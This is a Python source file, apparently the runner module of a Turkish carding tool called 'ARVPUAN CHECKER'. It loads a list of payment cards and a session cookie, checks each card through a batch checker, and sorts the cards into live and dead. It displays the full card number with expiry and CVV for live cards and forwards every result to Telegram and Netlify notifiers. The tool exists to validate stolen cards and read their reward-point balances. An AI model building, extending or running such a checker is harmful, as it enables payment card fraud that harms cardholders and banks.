"""
Runner — Rich UI ile hazir calistirici.
"""

import json
import sys
from datetime import datetime
from pathlib import Path
from typing import Optional

from .batch import BatchChecker
from .notifiers import TelegramNotifier, NetlifyNotifier

# Rich import — yoksa fallback
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.live import Live
    from rich.text import Text
    from rich import box
    _RICH = True
except ImportError:
    _RICH = False

CONFIG_FILE = "config.json"
CONFIG_TEMPLATE = {
    "cookie": "BURAYA_COOKIE_YAPISTIR",
    "cards_file": "cards.txt",
    "delay": 20.0,
}

console = Console() if _RICH else None


def _load_config() -> dict:
    path = Path(CONFIG_FILE)
    if not path.exists():
        with open(path, "w", encoding="utf-8") as f:
            json.dump(CONFIG_TEMPLATE, f, indent=2, ensure_ascii=False)
        if _RICH:
            console.print(Panel(
                "[yellow]config.json olusturuldu!\n"
                "Cookie alanini doldurup tekrar calistir.[/yellow]",
                title="[bold cyan]KURULUM[/bold cyan]",
                border_style="cyan"
            ))
        else:
            print("[!] config.json olusturuldu. Cookie'yi doldurup tekrar calistir.")
        sys.exit(0)

    with open(path, encoding="utf-8") as f:
        cfg = json.load(f)

    cookie = cfg.get("cookie", "").strip()
    if not cookie or cookie == CONFIG_TEMPLATE["cookie"]:
        if _RICH:
            console.print(Panel(
                "[red]Cookie bos veya degistirilmemis!\n"
                "config.json dosyasini ac ve cookie alanini doldur.[/red]",
                title="[bold red]HATA[/bold red]",
                border_style="red"
            ))
        else:
            print("[!] Cookie bos!")
        sys.exit(1)

    return cfg


def _print_banner() -> None:
    if not _RICH:
        print("=" * 50)
        print("  ARVPUAN CHECKER")
        print("=" * 50)
        return

    console.print(Panel(
        "[bold cyan]"
        "  █████╗ ██████╗ ██╗   ██╗██████╗ ██╗   ██╗ █████╗ ███╗   ██╗\n"
        " ██╔══██╗██╔══██╗██║   ██║██╔══██╗██║   ██║██╔══██╗████╗  ██║\n"
        " ███████║██████╔╝██║   ██║██████╔╝██║   ██║███████║██╔██╗ ██║\n"
        " ██╔══██║██╔══██╗╚██╗ ██╔╝██╔═══╝ ██║   ██║██╔══██║██║╚██╗██║\n"
        " ██║  ██║██║  ██║ ╚████╔╝ ██║     ╚██████╔╝██║  ██║██║ ╚████║\n"
        " ╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝[/bold cyan]",
        subtitle="[dim]Kart Puan Sorgulama[/dim]",
        border_style="cyan",
        padding=(0, 2),
    ))


def run(cards_file: Optional[str] = None) -> None:
    cfg        = _load_config()
    cookie     = cfg["cookie"]
    cards_path = cards_file or cfg.get("cards_file", "cards.txt")
    delay      = float(cfg.get("delay", 20.0))

    if not Path(cards_path).exists():
        if _RICH:
            console.print(f"[red][!] Kart dosyasi bulunamadi: {cards_path}[/red]")
        else:
            print(f"[!] Kart dosyasi bulunamadi: {cards_path}")
        sys.exit(1)

    with open(cards_path, encoding="utf-8") as f:
        cards = [line.strip() for line in f if line.strip()]

    if not cards:
        if _RICH:
            console.print("[red][!] Kart dosyasi bos![/red]")
        else:
            print("[!] Kart dosyasi bos!")
        sys.exit(1)

    _print_banner()

    # İstatistik tablosu (live güncellenir)
    stats = {"live": 0, "dead": 0, "err": 0, "total": len(cards), "done": 0}

    # Live sonuç tablosu
    live_table_rows = []

    tg = TelegramNotifier()
    nl = NetlifyNotifier()

    def _make_stats_table() -> Table:
        t = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold cyan")
        t.add_column("TOPLAM", style="white",        justify="center", min_width=10)
        t.add_column("LIVE",   style="bold green",   justify="center", min_width=10)
        t.add_column("DEAD",   style="bold red",     justify="center", min_width=10)
        t.add_column("HATA",   style="bold yellow",  justify="center", min_width=10)
        t.add_column("KALAN",  style="dim",          justify="center", min_width=10)
        kalan = stats["total"] - stats["done"]
        t.add_row(
            str(stats["total"]),
            str(stats["live"]),
            str(stats["dead"]),
            str(stats["err"]),
            str(kalan),
        )
        return t

    def _make_live_table() -> Table:
        t = Table(
            title="[bold green]LIVE KARTLAR[/bold green]",
            box=box.ROUNDED,
            show_header=True,
            header_style="bold green",
            border_style="green",
        )
        t.add_column("KART",    style="bold white",  min_width=25)
        t.add_column("PUAN",    style="bold green",  min_width=12)
        t.add_column("BANKA",   style="cyan",        min_width=15)
        t.add_column("PROGRAM", style="dim",         min_width=10)
        t.add_column("ZAMAN",   style="dim",         min_width=10)
        for row in live_table_rows:
            t.add_row(*row)
        return t

    if _RICH:
        live_display = Live(console=console, refresh_per_second=4)
        live_display.start()
    else:
        live_display = None

    def _refresh() -> None:
        if not _RICH or live_display is None:
            return
        from rich.columns import Columns
        from rich import print as rprint
        panels = [Panel(_make_stats_table(), title="[bold cyan]DURUM[/bold cyan]", border_style="cyan")]
        if live_table_rows:
            panels.append(_make_live_table())
        live_display.update(Columns(panels) if len(panels) > 1 else panels[0])

    def on_result(r):
        stats["done"] += 1
        if r.is_live:
            stats["live"] += 1
            # Tam kart numarası + puan
            full = r.full_card if r.full_card else r.card
            card_str = full + "|" + r.month + "|" + r.year + "|" + r.cvv
            zaman = datetime.now().strftime("%H:%M:%S")
            live_table_rows.append((
                card_str,
                r.formatted,
                r.bank,
                r.program,
                zaman,
            ))
            if not _RICH:
                print(f"[LIVE] {card_str} | {r.formatted} | {r.bank}")
        elif r.is_dead:
            stats["dead"] += 1
            if not _RICH:
                print(f"[DEAD] {r.card}")
        else:
            stats["err"] += 1
            if not _RICH:
                print(f"[ERR]  {r.card or r.card_data[:20]} | {r.error}")

        _refresh()
        tg.send(r)
        nl.send(r)

    def on_log(msg: str) -> None:
        if _RICH:
            if "SESSION" in msg:
                console.log(f"[yellow]{msg}[/yellow]")
            elif "Basladi" in msg or "Tamamlandi" in msg:
                console.log(f"[cyan]{msg}[/cyan]")
        else:
            print(msg)

    def on_done(live, dead, error):
        if live_display:
            live_display.stop()

        tg.send_summary(live, dead, error)

        if _RICH:
            # Final özet
            console.print()
            console.print(Panel(
                "[bold green]LIVE  : " + str(live)  + "[/bold green]\n"
                "[bold red]DEAD  : "  + str(dead)  + "[/bold red]\n"
                "[bold yellow]HATA  : " + str(error) + "[/bold yellow]",
                title="[bold cyan]TARAMA TAMAMLANDI[/bold cyan]",
                border_style="cyan",
            ))
            if live_table_rows:
                console.print(_make_live_table())
        else:
            print(f"\nTamamlandi — LIVE:{live} DEAD:{dead} ERR:{error}")

    if _RICH:
        console.print(f"\n[cyan]Toplam [bold]{len(cards)}[/bold] kart — delay: [bold]{delay}s[/bold][/cyan]\n")

    _refresh()

    batch = BatchChecker(
        cookie=cookie,
        delay=delay,
        on_result=on_result,
        on_log=on_log,
        on_done=on_done,
    )
    batch.run(cards)


if __name__ == "__main__":
    cards_arg = sys.argv[1] if len(sys.argv) > 1 else None
    run(cards_arg)
